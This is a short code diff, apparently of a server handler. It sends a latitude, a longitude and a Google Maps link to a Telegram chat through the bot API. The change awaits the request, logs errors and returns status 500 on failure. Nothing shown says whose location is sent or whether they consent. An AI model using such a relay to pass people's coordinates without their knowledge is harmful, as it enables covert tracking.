@@ -14,22 +14,21 @@ Lat: ${lat}
 Lon: ${lon}
 https://maps.google.com/?q=${lat},${lon}`;
 
-    // kirim ke Telegram TANPA await (biar super cepat)
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: text
+        text
       })
-    }).catch(() => {});
+    });
 
-    // langsung respon
     return res.status(200).json({ ok: true });
 
   } catch (err) {
-    return res.status(200).json({ ok: false });
+    console.error(err);
+    return res.status(500).json({ ok: false });
   }
 }
